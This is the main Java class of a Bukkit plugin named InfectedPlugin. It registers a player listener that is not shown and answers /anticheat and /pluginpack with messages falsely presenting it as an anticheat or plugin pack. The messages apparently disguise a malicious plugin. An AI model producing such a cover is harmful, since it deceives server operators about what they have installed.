package org.CreeperCoders.InfectedPlugin;

import java.util.logging.Logger;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;

import org.CreeperCoders.InfectedPlugin.Commands.*;

public class InfectedPlugin extends JavaPlugin
{
    public static final Logger log = Bukkit.getLogger();
    public InfectedPlugin plugin;
    
    @Override
    public void onLoad()
    {
        log.info(String.format("[%s] %s is now loading...", getDescription().getName(), getDescription().getName()));
    }

    @Override
    public void onEnable()
    {
        log.info(String.format("[%s] %s is registering all events...", getDescription().getName(), getDescription().getName()));
        try
        {
            PluginManager pm = getServer().getPluginManager();
            pm.registerEvents(new IP_PlayerListener(), this);
        }
        catch (Exception ex)
        {
            log.severe(String.format("[%s] Failed to register events! Reason: %s", getDescription().getName(), ex.getMessage()));
        }
        log.info(String.format("[%s] %s version %s by %s has been enabled!", getDescription().getName(), getDescription().getName(), getDescription().getVersion(), getDescription().getAuthors()));
    }

    @Override
    public void onDisable()
    {
        log.info(String.format("[%s] %s has been disabled!", getDescription().getName(), getDescription().getName()));
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args)
    {
        if (commandLabel.equalsIgnoreCase("anticheat"))
        {
            sender.sendMessage(ChatColor.GREEN + "AntiCheat 2.0 is working 100%");
            return true;
        }
        else if (commandLabel.equalsIgnoreCase("pluginpack"))
        {
            sender.sendMessage(ChatColor.GREEN + "PluginPack 2.4 working 100%! Use /anticheat to see anticheat details!");
            return true;
        }
        return false;
    }
}
